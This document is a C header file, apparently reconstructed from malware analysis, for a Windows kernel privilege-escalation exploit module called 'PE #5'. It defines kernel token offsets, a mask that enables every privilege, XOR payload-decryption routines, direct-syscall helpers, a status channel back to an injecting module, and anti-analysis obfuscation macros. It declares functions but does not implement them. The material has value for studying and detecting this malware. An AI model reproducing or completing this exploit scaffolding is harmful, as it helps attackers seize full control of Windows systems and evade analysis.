/**
 * PE #5 - Windows Kernel Privilege Escalation Exploit
 * 
 * RECONSTRUCTED FROM SECURITY ANALYSIS
 * Classification: TLP:RED - Security Research Only
 * 
 * This header defines the structures and constants used by the
 * privilege escalation exploit that targets Windows kernel
 * _EPROCESS.Token structure.
 */

#ifndef PE5_EXPLOIT_H
#define PE5_EXPLOIT_H

#include <windows.h>
#include <winternl.h>

#pragma warning(disable: 4201)  // nameless struct/union

//=============================================================================
// CONFIGURATION CONSTANTS
//=============================================================================

// PE #5 Binary Properties
#define PE5_SIZE                    22702       // Total module size in bytes
#define PE5_SYSCALL_OFFSET          0x2C10      // SYSCALL instruction offset
#define PE5_XOR_OPERATIONS          157         // Number of XOR decrypt operations

// Key Derivation
#define KEY_DERIVE_OFFSET_1         3           // First header byte offset
#define KEY_DERIVE_OFFSET_2         7           // Second header byte offset
#define PE5_XOR_KEY                 0xA4        // Derived XOR key

// Encrypted parameter values (before XOR decryption)
#define ENC_PARAM_EAX               0xEAAE52F9
#define ENC_PARAM_ECX               0x3DDCE8E5
#define ENC_PARAM_EDX               0x7A8B3C91

// Windows Kernel Offsets (Windows 10/11)
#define EPROCESS_TOKEN_OFFSET_W10   0x4B8       // Windows 10 Token offset
#define EPROCESS_TOKEN_OFFSET_W11   0x4B8       // Windows 11 Token offset
#define TOKEN_PRIVILEGES_OFFSET     0x40        // Offset to Privileges in TOKEN

// Privilege Bits
#define SE_ALL_PRIVILEGES           0xFFFFFFFFFFFFFFFF

//=============================================================================
// NT KERNEL STRUCTURES
//=============================================================================

/**
 * SEP_TOKEN_PRIVILEGES structure
 * Located at TOKEN + 0x40
 */
typedef struct _SEP_TOKEN_PRIVILEGES {
    ULONGLONG Present;              // +0x00: Privileges that exist
    ULONGLONG Enabled;              // +0x08: Privileges currently enabled
    ULONGLONG EnabledByDefault;     // +0x10: Default enabled privileges
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;

/**
 * For simplified operations only. 
 * See common/ntdefs.h for complete TOKEN structure.
 */
typedef struct _TOKEN_PARTIAL {
    BYTE                    Reserved[0x40];     // Offset 0x00-0x3F
    SEP_TOKEN_PRIVILEGES    Privileges;         // Offset 0x40
    // ... additional fields in common/ntdefs.h TOKEN structure
} TOKEN_PARTIAL, *PTOKEN_PARTIAL;

/**
 * Simplified EPROCESS structure for token access
 */
typedef struct _EPROCESS_PARTIAL {
    BYTE        Reserved[0x4B8];        // Offset 0x00-0x4B7
    PVOID       Token;                  // Offset 0x4B8 (Windows 10/11)
    // ... additional fields not needed for exploit
} EPROCESS_PARTIAL, *PEPROCESS_PARTIAL;

//=============================================================================
// SYSCALL STRUCTURES
//=============================================================================

/**
 * Direct SYSCALL parameters structure
 * Loaded into registers before SYSCALL instruction
 */
typedef struct _SYSCALL_PARAMS {
    ULONG64     Rax;        // Syscall number / return value
    ULONG64     Rcx;        // First parameter (becomes return addr in kernel)
    ULONG64     Rdx;        // Second parameter
    ULONG64     R8;         // Third parameter
    ULONG64     R9;         // Fourth parameter
} SYSCALL_PARAMS, *PSYSCALL_PARAMS;

//=============================================================================
// EXPLOIT STATUS CODES
//=============================================================================

typedef enum _EXPLOIT_STATUS {
    EXPLOIT_SUCCESS                 = 0,
    EXPLOIT_DECRYPTION_FAILED       = 1,
    EXPLOIT_SYSCALL_FAILED          = 2,
    EXPLOIT_TOKEN_NOT_FOUND         = 3,
    EXPLOIT_PRIVILEGE_CHECK_FAILED  = 4,
    EXPLOIT_UNKNOWN_ERROR           = 0xFF
} EXPLOIT_STATUS;

//=============================================================================
// FUNCTION DECLARATIONS
//=============================================================================

/**
 * Main exploit entry point
 * Called by PE #1 after memory injection
 */
EXPLOIT_STATUS 
WINAPI 
PE5_ExploitMain(VOID);

/**
 * Runtime XOR decryption of exploit code
 * Uses key derived from header bytes
 */
BOOL 
PE5_DecryptPayload(
    PBYTE   ModuleBase,
    DWORD   ModuleSize
);

/**
 * Derive XOR key from module header
 * Formula: key = header[3] ^ header[7]
 */
BYTE 
PE5_DeriveKey(
    PBYTE   ModuleBase
);

/**
 * Execute SYSCALL to transition to kernel mode
 * Location: offset 0x2C10 in decrypted code
 */
NTSTATUS 
PE5_ExecuteSyscall(
    PSYSCALL_PARAMS Params
);

/**
 * Modify process token privileges in kernel
 * Sets all privilege bits to 0xFFFFFFFFFFFFFFFF
 */
BOOL 
PE5_ModifyTokenPrivileges(
    PVOID   ProcessToken
);

/**
 * Verify privilege escalation succeeded
 */
BOOL 
PE5_VerifyPrivileges(VOID);

/**
 * Signal success to PE #1 via shared memory
 */
VOID 
PE5_SignalSuccess(
    BOOL    Success
);

//=============================================================================
// ASSEMBLY FUNCTIONS (defined in exploit_asm.asm)
//=============================================================================

/**
 * Direct SYSCALL execution in assembly
 */
extern NTSTATUS 
__stdcall 
AsmDoSyscall(
    ULONG   SyscallNumber,
    ULONG64 Param1,
    ULONG64 Param2,
    ULONG64 Param3,
    ULONG64 Param4
);

/**
 * Get current EPROCESS address (kernel mode)
 */
extern PVOID 
__stdcall 
AsmGetCurrentProcess(VOID);

/**
 * Inline XOR decryption loop
 */
extern VOID 
__stdcall 
AsmXorDecrypt(
    PBYTE   Buffer,
    DWORD   Size,
    BYTE    Key
);

//=============================================================================
// SHARED MEMORY COMMUNICATION
//=============================================================================

#define PE5_STATUS_SHARED_MEM_NAME  L"Local\\PE5_Status"
#define PE5_STATUS_NOT_STARTED      0
#define PE5_STATUS_IN_PROGRESS      1
#define PE5_STATUS_SUCCESS          2
#define PE5_STATUS_FAILED           3

/**
 * Shared memory structure for PE #1 <-> PE #5 communication
 */
typedef struct _PE5_SHARED_STATUS {
    DWORD   Status;             // Current exploitation status
    DWORD   ErrorCode;          // Error code if failed
    ULONG64 NewPrivileges;      // New privilege mask after exploit
    BYTE    Reserved[48];       // Reserved for future use
} PE5_SHARED_STATUS, *PPE5_SHARED_STATUS;

//=============================================================================
// ANTI-ANALYSIS MACROS
//=============================================================================

// Obfuscate string literals
#define OBFUSCATE_BYTE(b, k)    ((b) ^ (k))

// Prevent inlining of critical functions
#define NOINLINE                __declspec(noinline)

// Force volatile memory access
#define VOLATILE_READ(ptr)      (*(volatile BYTE*)(ptr))
#define VOLATILE_WRITE(ptr, v)  (*(volatile BYTE*)(ptr) = (v))

#endif // PE5_EXPLOIT_H
